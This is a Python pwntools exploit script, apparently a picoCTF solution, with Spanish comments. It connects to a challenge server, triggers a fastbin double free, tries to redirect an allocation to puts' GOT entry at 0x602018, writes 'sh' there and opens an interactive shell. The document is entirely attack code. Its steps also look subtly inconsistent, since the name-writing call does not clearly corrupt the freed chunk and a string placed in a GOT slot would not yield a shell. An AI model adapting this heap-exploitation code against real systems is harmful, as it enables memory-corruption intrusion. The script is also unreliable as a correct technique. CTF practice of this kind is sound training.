#!/usr/bin/env python3
from pwn import *

context.log_level = 'debug'  # Ver todo para debug
p = remote('jupiter.challenges.picoctf.org', 9521)

# Nombre
p.sendlineafter(b'name?', b'A'*8)

def buy(size):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b'How much', str(size).encode())

def eat(idx):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b'Which', str(idx).encode())

def name(data):
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b'name?', data)

# Crear chunks
buy(0x20)  # 0
buy(0x20)  # 1

# Double free
eat(0)
eat(1)
eat(0)  # double free

# fastbin: 0 -> 1 -> 0

# Allocar y poner dirección objetivo
buy(0x20)  # obtiene 0
name(p64(0x602018))  # GOT de puts

# Continuar la cadena
buy(0x20)  # obtiene 1
buy(0x20)  # obtiene 0
buy(0x20)  # obtiene GOT!

# Escribir en GOT
name(b'sh\x00')

# Trigger
p.sendline(b'2')
p.sendline(b'0')

p.interactive()